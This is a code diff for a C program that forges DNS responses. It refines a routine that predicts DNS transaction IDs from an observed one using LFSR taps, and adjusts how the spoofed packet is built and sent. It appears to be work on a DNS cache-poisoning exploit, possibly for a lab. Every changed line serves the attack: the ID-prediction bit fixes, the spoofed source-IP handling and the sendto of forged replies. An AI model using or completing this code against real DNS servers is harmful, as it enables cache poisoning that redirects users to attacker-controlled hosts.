@@ -128,7 +128,7 @@ int full_spoofed_answer(uint txid, uint d_port) {
         perror("Socket creation failed");
         return EXIT_FAILURE;
     }
-
+    return 0;
 }
 
 
@@ -211,6 +211,9 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
     server_addr.sin_port = htons(destination_port);
     inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
 
+    // struct iphdr *iph = (struct iphdr *)buffer;
+    // iph->saddr = inet_addr("192.168.1.207"); // Source IP
+
     // Step 3: Assume we already have the DNS query (this would normally come from the client)
     unsigned char query[BUFFER_SIZE];
     int query_len = build_dns_query(query, hostname, qtxid);  
@@ -221,8 +224,6 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
     printf("query: %s\n", query);
     printf("destination_ip: %s\n", destination_ip);
     
-    struct iphdr *iph = (struct iphdr *)buffer;
-    iph->saddr = inet_addr("192.168.1.207"); // Source IP
     // Step 5: Send the spoofed DNS response
     if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
         perror("Failed to send spoofed DNS response");
@@ -239,15 +240,15 @@ void fill_txids(uint32_t *txid_ls, uint32_t txid){
     // if the LSbit of r_1 = LSbit r_2 = 0 
     txid_ls[8] = txid >> 1;
     // set the left most bit of txid_ls[0] to 1, txid is 16 bits
-    txid_ls[9] = (txid >> 1) | 0x8000;
+    txid_ls[9] = (txid >> 1) | (1<<15);
 
     // else if the LSbit of r_1 = LSbit r_2 = 1
     for (int i = 0; i < 4; i ++) {
-        txid_ls[i] = ((((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2) | (14<<i);
+        txid_ls[i] = ((((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2) | (i<<14);
     }
     
     for (int i = 0; i < 4; i ++) {
-        txid_ls[4 + i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) | (14<<i);
+        txid_ls[4 + i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) | (i<<14);
     }
 }
     
